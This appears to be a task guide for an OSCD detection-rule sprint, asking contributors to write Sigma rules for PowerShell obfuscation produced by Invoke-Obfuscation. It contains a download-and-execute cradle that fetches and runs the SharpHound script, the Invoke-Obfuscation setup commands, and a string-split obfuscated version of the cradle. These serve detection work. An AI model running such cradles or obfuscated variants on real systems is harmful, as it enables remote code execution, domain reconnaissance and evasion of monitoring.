# Hello, fellow OSCD participant!
This is your guide on how you can help us with soving this issue.

# Tasklist
You can pick up some of the methods of PowerShell command and script obfuscation, provided by the [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation) framework from the table below and develop Sigma rules for them. You will need to use [regular expressions](https://github.com/Neo23x0/sigma/wiki/Specification#types) in Sigma rules.

## Original command
```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound
```

## Invoke-Obfuscation premise
```powershell
Import-Module ./Invoke-Obfuscation.psd1
Invoke-Obfuscation
SET SCRIPTBLOCK Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound
```
## 

| Case # | Option #1 | Option #2 | Option #3 | Result |
| ------ | ------- | --- | --- | --- |
| 2 | TOKEN | TOKEN\STRING | TOKEN\STRING\1 | Invoke-Expression (New-Object Net.WebClient).DownloadString(('ht'+'tp'+'s://raw.gith'+'ubus'+'e'+'rcont'+'ent.com/BloodHo'+'und'+'A'+'D'+'/B'+'loo'+'dHo'+'un'+'d/a7'+'e'+'a5'+'36'+'387'+'0d92'+'5bc31'+'d'+'3'+'a441a361f38b0a'+'add0b'+'/Inge'+'s'+'tors/'+'Shar'+'pHou'+'n'+'d'+'.ps'+'1')); Invoke-BloodHound |

